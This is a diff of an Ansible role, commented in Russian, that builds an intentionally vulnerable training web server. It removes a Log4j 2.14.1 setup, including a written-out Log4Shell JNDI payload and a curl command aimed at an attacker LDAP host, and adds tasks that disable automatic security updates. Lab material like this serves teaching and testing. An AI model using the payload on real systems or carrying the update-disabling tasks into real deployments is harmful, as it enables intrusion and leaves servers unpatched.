@@ -1,121 +1,12 @@
 ---
-# Ansible роль: Настройка веб-сервера с уязвимостью Log4Shell
+# Ansible роль: Настройка веб-сервера с уязвимостями ОС
 
 - name: Установка Apache
   apt:
     name:
       - apache2
-      - openjdk-11-jdk
-      - maven
     state: present
     update_cache: yes
-  become: yes
-
-- name: Создание директории для веб-приложения
-  file:
-    path: /var/www/vulnerable-app
-    state: directory
-    mode: '0755'
-  become: yes
-
-- name: Загрузка уязвимой версии Log4j
-  get_url:
-    url: https://archive.apache.org/dist/logging/log4j/2.14.1/apache-log4j-2.14.1-bin.tar.gz
-    dest: /tmp/log4j.tar.gz
-    mode: '0644'
-  become: yes
-  ignore_errors: yes
-
-- name: Распаковка Log4j
-  unarchive:
-    src: /tmp/log4j.tar.gz
-    dest: /opt/
-    remote_src: yes
-  become: yes
-  ignore_errors: yes
-
-- name: Создание уязвимого Java приложения
-  copy:
-    content: |
-      package com.techservice.vulnerable;
-      
-      import org.apache.logging.log4j.LogManager;
-      import org.apache.logging.log4j.Logger;
-      
-      public class VulnerableApp {
-          private static final Logger logger = LogManager.getLogger(VulnerableApp.class);
-          
-          public static void main(String[] args) {
-              logger.info("Application started");
-              if (args.length > 0) {
-                  logger.info("User input: {}", args[0]); // Уязвимость здесь!
-              }
-          }
-      }
-    dest: /var/www/vulnerable-app/VulnerableApp.java
-    mode: '0644'
-  become: yes
-
-- name: Создание log4j2.xml конфигурации
-  copy:
-    content: |
-      <?xml version="1.0" encoding="UTF-8"?>
-      <Configuration status="WARN">
-        <Appenders>
-          <Console name="Console" target="SYSTEM_OUT">
-            <PatternLayout pattern="%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n"/>
-          </Console>
-        </Appenders>
-        <Loggers>
-          <Root level="info">
-            <AppenderRef ref="Console"/>
-          </Root>
-        </Loggers>
-      </Configuration>
-    dest: /var/www/vulnerable-app/log4j2.xml
-    mode: '0644'
-  become: yes
-
-- name: Компиляция уязвимого приложения
-  command: javac -cp "/opt/apache-log4j-2.14.1-bin/log4j-api-2.14.1.jar:/opt/apache-log4j-2.14.1-bin/log4j-core-2.14.1.jar" /var/www/vulnerable-app/VulnerableApp.java
-  args:
-    chdir: /var/www/vulnerable-app
-    creates: /var/www/vulnerable-app/VulnerableApp.class
-  become: yes
-  ignore_errors: yes
-
-- name: Создание Apache виртуального хоста для уязвимого приложения
-  template:
-    src: vulnerable-app.conf.j2
-    dest: /etc/apache2/sites-available/vulnerable-app.conf
-    mode: '0644'
-  become: yes
-  notify: restart apache
-
-- name: Активация виртуального хоста
-  file:
-    src: /etc/apache2/sites-available/vulnerable-app.conf
-    dest: /etc/apache2/sites-enabled/vulnerable-app.conf
-    state: link
-  become: yes
-  notify: restart apache
-
-- name: Создание CGI скрипта для тестирования
-  copy:
-    content: |
-      #!/bin/bash
-      echo "Content-Type: text/html"
-      echo ""
-      echo "<html><body>"
-      echo "<h1>Vulnerable Web Application</h1>"
-      echo "<p>This application uses Log4j 2.14.1 (CVE-2021-44228)</p>"
-      echo "<form method='GET' action='/cgi-bin/test.sh'>"
-      echo "<input type='text' name='q' placeholder='Enter search query'>"
-      echo "<input type='submit' value='Search'>"
-      echo "</form>"
-      echo "</body></html>"
-    dest: /usr/lib/cgi-bin/test.sh
-    mode: '0755'
   become: yes
 
 - name: Включение модулей Apache
@@ -157,22 +48,39 @@
     enabled: yes
   become: yes
 
-- name: Создание информационного файла об уязвимости
+- name: Отключение автоматических обновлений безопасности
+  lineinfile:
+    path: /etc/apt/apt.conf.d/50unattended-upgrades
+    regexp: "^Unattended-Upgrade::Automatic-Reboot"
+    line: "Unattended-Upgrade::Automatic-Reboot \"false\";"
+    insertafter: "^//Unattended-Upgrade::Automatic-Reboot"
+  become: yes
+  ignore_errors: yes
+
+- name: Отключение автоматических обновлений
+  file:
+    path: /etc/apt/apt.conf.d/20auto-upgrades
+    state: absent
+  become: yes
+  ignore_errors: yes
+
+- name: Создание информационного файла об уязвимостях ОС
   copy:
     content: |
-      # Уязвимость Log4Shell (CVE-2021-44228)
+      # Уязвимости операционной системы
       
-      Этот сервер настроен с уязвимостью Log4Shell для обучения.
+      Этот сервер настроен с уязвимостями ОС для обучения:
       
-      Версия Log4j: 2.14.1
-      CVE: CVE-2021-44228
+      1. Отключены автоматические обновления безопасности
+      2. Небезопасная конфигурация Apache (раскрытие версии)
+      3. Открытые порты без фильтрации
+      4. Устаревшие версии пакетов ОС
       
-      Для тестирования используйте:
-      ${jndi:ldap://<attacker-ip>:1389/Exploit}
-      
-      Пример:
-      curl -H "User-Agent: \${jndi:ldap://192.168.10.5:1389/Exploit}" http://192.168.10.10/
-    dest: /var/www/vulnerable-app/VULNERABILITY_INFO.txt
+      Для тестирования:
+      - Проверка версии Apache: curl -I http://localhost
+      - Проверка обновлений: apt list --upgradable
+      - Проверка открытых портов: netstat -tulpn
+    dest: /var/www/html/VULNERABILITY_INFO.txt
     mode: '0644'
   become: yes
 
